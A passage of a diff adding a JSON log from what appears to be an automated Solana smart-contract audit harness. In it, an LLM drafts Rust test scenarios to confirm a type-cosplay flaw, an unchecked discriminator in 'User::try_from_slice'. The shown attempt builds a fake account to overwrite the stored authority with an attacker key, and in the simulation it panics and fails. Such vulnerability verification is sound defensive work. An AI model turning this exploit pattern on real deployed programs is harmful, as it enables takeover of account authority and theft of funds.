+        ],
+        "elapsed_s": 1.6
+      },
+      "verdict": null,
+      "reason": "o baseline 'initialize legitimo' falhou com UnknownError(ProgramFailedToComplete); o uso legitimo precisa ter sucesso (revise layout das contas, seeds, flags de assinatura/escrita e argumentos)"
+    },
+    {
+      "attempt": 5,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 2775,
+        "completion_tokens": 654,
+        "latency_s": 3.63
+      },
+      "raw": "{\"plan\": \"O baseline falhou porque a conta `user` foi passada como `AccountInfo` sem ser signer nem writable corretamente, e o `authority` precisa assinar. Vou montar a conta `user` como writable e o `authority` como signer, ambos existentes. O ataque fornece uma conta com discriminador de outro tipo mas mesmos 32 bytes iniciais, explorando a desserializacao manual sem verificacao de discriminador. O efeito mede se a authority gravada na conta fake e a chave do atacante.\", \"scenario\": \"let authority = Pubkey::new_unique();\\nlet attacker = Pubkey::new_unique();\\n\\nlet user_key = Pubkey::new_unique();\\nlet fake_key = Pubkey::new_unique();\\n\\n// Conta legitima: dados de User (32 bytes = authority)\\nlet user_data = anchor_account_data(\\\"User\\\", &(authority,));\\nlet user_account = account(&env.program_id, &user_data, None);\\n\\nlet metas = vec![\\n    AccountMeta::new(user_key, false),\\n    AccountMeta::new_readonly(authority, true),\\n];\\nlet contas = vec![\\n    (user_key, user_account.clone()),\\n    (authority, wallet(1_000_000_000)),\\n];\\n\\nlet ix = env.anchor_ix(\\\"initialize\\\", &(), metas);\\nlet r = env.baseline(\\\"initialize legitimo\\\", &ix, &contas);\\n\\n// Ataque: conta com dados de outro tipo (discriminador diferente) mas mesmos 32 bytes iniciais\\nlet fake_data = anchor_account_data(\\\"OutroTipo\\\", &(attacker,));\\nlet fake_account = account(&env.program_id, &fake_data, None);\\n\\nlet metas_ataque = vec![\\n    AccountMeta::new(fake_key, false),\\n    AccountMeta::new_readonly(attacker, true),\\n];\\nlet contas_ataque = vec![\\n    (fake_key, fake_account),\\n    (attacker, wallet(1_000_000_000)),\\n];\\n\\nlet ix_ataque = env.anchor_ix(\\\"initialize\\\", &(), metas_ataque);\\nlet r_ataque = env.attack(\\\"cosplay: conta de outro tipo aceita como User\\\", &ix_ataque, &contas_ataque);\\n\\nif r_ataque.program_result == ProgramResult::Success {\\n    let dados = after(&r_ataque, &fake_key).data();\\n    let authority_gravada = read_pubkey(dados, 0);\\n    env.effect(\\\"authority sobrescrita com chave do atacante em conta de outro tipo\\\", authority_gravada == attacker);\\n}\"}",
+      "plan": "O baseline falhou porque a conta `user` foi passada como `AccountInfo` sem ser signer nem writable corretamente, e o `authority` precisa assinar. Vou montar a conta `user` como writable e o `authority` como signer, ambos existentes. O ataque fornece uma conta com discriminador de outro tipo mas mesmos 32 bytes iniciais, explorando a desserializacao manual sem verificacao de discriminador. O efeito mede se a authority gravada na conta fake e a chave do atacante.",
+      "scenario": "let authority = Pubkey::new_unique();\nlet attacker = Pubkey::new_unique();\n\nlet user_key = Pubkey::new_unique();\nlet fake_key = Pubkey::new_unique();\n\n// Conta legitima: dados de User (32 bytes = authority)\nlet user_data = anchor_account_data(\"User\", &(authority,));\nlet user_account = account(&env.program_id, &user_data, None);\n\nlet metas = vec![\n    AccountMeta::new(user_key, false),\n    AccountMeta::new_readonly(authority, true),\n];\nlet contas = vec![\n    (user_key, user_account.clone()),\n    (authority, wallet(1_000_000_000)),\n];\n\nlet ix = env.anchor_ix(\"initialize\", &(), metas);\nlet r = env.baseline(\"initialize legitimo\", &ix, &contas);\n\n// Ataque: conta com dados de outro tipo (discriminador diferente) mas mesmos 32 bytes iniciais\nlet fake_data = anchor_account_data(\"OutroTipo\", &(attacker,));\nlet fake_account = account(&env.program_id, &fake_data, None);\n\nlet metas_ataque = vec![\n    AccountMeta::new(fake_key, false),\n    AccountMeta::new_readonly(attacker, true),\n];\nlet contas_ataque = vec![\n    (fake_key, fake_account),\n    (attacker, wallet(1_000_000_000)),\n];\n\nlet ix_ataque = env.anchor_ix(\"initialize\", &(), metas_ataque);\nlet r_ataque = env.attack(\"cosplay: conta de outro tipo aceita como User\", &ix_ataque, &contas_ataque);\n\nif r_ataque.program_result == ProgramResult::Success {\n    let dados = after(&r_ataque, &fake_key).data();\n    let authority_gravada = read_pubkey(dados, 0);\n    env.effect(\"authority sobrescrita com chave do atacante em conta de outro tipo\", authority_gravada == attacker);\n}",
+      "run": {
+        "kind": "panic",
+        "events": [
+          {
+            "step": "setup",
+            "attacker_program": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM"
+          },
+          {
+            "step": "baseline",
+            "note": "initialize legitimo",
+            "result": "UnknownError(ProgramFailedToComplete)",
+            "compute_units": 3238,
+            "account_flags": "-w,sr",
+            "ix_head": "afaf6d1f0d989bed",
+            "accounts": [
+              {
+                "key": "11111112cMQwSC9qirWGjZM6gLGwW69X22mqwLLGP",
+                "signer": false,
+                "writable": true,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 40,
+                "head": "9f755fe3ef973aec",
+                "digest": "cc83b2d6cc3fbaaa",
+                "post": "9f755fe3ef973aec0000000000000002000000000000000000000000000000000000000000000000"
+              },
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "attack",
+            "note": "cosplay: conta de outro tipo aceita como User",
+            "result": "UnknownError(ProgramFailedToComplete)",
+            "compute_units": 3238,
+            "account_flags": "-w,sr",
+            "ix_head": "afaf6d1f0d989bed",
+            "accounts": [
+              {
+                "key": "111111131h1vYVSYuKP6AhS86fbRdMw9XHiZAvAaj",
+                "signer": false,
+                "writable": true,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 40,
+                "head": "b14ae9d470b01bc5",
+                "digest": "b1ab52112c24a508",
+                "post": "b14ae9d470b01bc50000000000000003000000000000000000000000000000000000000000000000"
+              },
+              {
+                "key": "11111112D1oxKts8YPdTJRG5FzxTNpMtWmq8hkVx3",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          }
+        ],
+        "detail": "[2026-10-13T23:23:52.231160758Z DEBUG solana_runtime::message_processor::stable_log] Program log: panicked at sealevel/sl_04_ins/src/lib.rs:11:79:     called `Result::unwrap()` on an `Err` value: Custom { kind: InvalidData, error: \"Not all bytes read\" }",
+        "runtime_trace": [
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 3238 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS failed: SBF program panicked",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 3238 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS failed: SBF program panicked"
+        ],
+        "elapsed_s": 1.6
+      },
+      "verdict": null,
+      "reason": "o baseline 'initialize legitimo' falhou com UnknownError(ProgramFailedToComplete); o uso legitimo precisa ter sucesso (revise layout das contas, seeds, flags de assinatura/escrita e argumentos)"
+    }
+  ],
+  "case_id": "SL-04-INS",
+  "static_finding": {
+    "category": "COSPLAY",
+    "confidence": "high",
+    "evidence": "let mut user = User::try_from_slice(&ctx.accounts.user.data.borrow()).unwrap();",
+    "explanation": "Os dados da conta `user` sao desserializados manualmente via `User::try_from_slice` a partir de um `AccountInfo`, sem verificar nenhum discriminador de tipo. Como `User` nao possui discriminador e a desserializacao e manual, uma conta com layout compativel de outro tipo pode ser interpretada como `User`.",
+    "attack_hypothesis": "Um atacante fornece uma conta cujos dados foram estruturados para se parecerem com `User` (por exemplo, uma conta de outro tipo com os mesmos 32 bytes iniciais), fazendo o programa tratar dados de um tipo diferente como `User` e sobrescrever o campo `authority`."
+  }
+}
